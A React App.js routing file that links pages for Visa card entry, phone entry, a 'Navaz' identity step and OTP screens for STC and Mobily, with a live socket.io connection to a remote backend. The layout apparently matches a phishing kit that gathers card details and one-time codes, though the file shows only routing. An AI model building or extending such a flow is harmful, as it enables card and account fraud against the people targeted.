import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useState } from "react";
import { io } from "socket.io-client";
import VisaPage from "./Pages/VisaPage";
import PhonePage from "./Pages/PhonePage";
import NavazPage from "./Pages/Navaz";
import Success from "./Pages/Success";
import Main from "./Pages/Main";
import Otp from "./Pages/Otp";
import PhoneOtp from "./Pages/PhoneOtp";
import STCOTP from "./Pages/STCOTP";
import MobOtp from "./Pages/MobOtp";

// export const api_route = "http://localhost:8080";
export const api_route = "https://kng-se.onrender.com";
export const socket = io(api_route);

function App() {
  const [loading, setLoading] = useState(false);

  return (
    <div className="min-h-screen w-full flex items-start justify-center bg-gray-50">
      <div className="w-full  relative">
        <BrowserRouter>
          <Routes>
            <Route
              path="/"
              element={<Main />}
            />
            <Route
              path="/visa"
              element={<VisaPage loading={loading} setLoading={setLoading} />}
            />
            <Route
              path="/phone"
              element={<PhonePage />}
            />
            <Route path="/navaz" element={<NavazPage />} />
            <Route path="/success" element={<Success />} />
            <Route
              path='/otp'
              element={<Otp />}
            />
            <Route
              path="/phoneOtp"
              element={<PhoneOtp />}
            />
            <Route
              path="/stcOtp"
              element={<STCOTP />}
            />
            <Route
              path="/mobilyOtp"
              element={<MobOtp />}
            />
          </Routes>
        </BrowserRouter>
      </div>
    </div>
  );
}

export default App;
